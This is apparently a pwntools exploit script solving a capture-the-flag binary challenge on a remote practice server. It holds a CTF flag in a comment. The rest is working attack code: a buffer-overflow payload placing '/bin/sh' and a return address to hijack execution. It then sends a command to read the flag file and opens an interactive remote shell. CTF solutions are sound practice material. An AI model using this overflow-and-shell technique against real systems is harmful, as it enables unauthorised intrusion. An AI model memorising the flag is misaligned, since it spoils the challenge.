#!/usr/bin/env python
from pwn import *

# AD{L1nux_sy5ca111l1l1ll1ll11111111}

context.arch = 'amd64'

host , port = 'ctf.yuawn.idv.tw' , 10108
y = remote( host , port )

p = '/bin/sh\x00'
p += 'D' * ( 0x128 - len( p ) )
p += p64( 0x4000ed )
p += 'a' * ( 322 - len( p ) )

y.send( p )

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()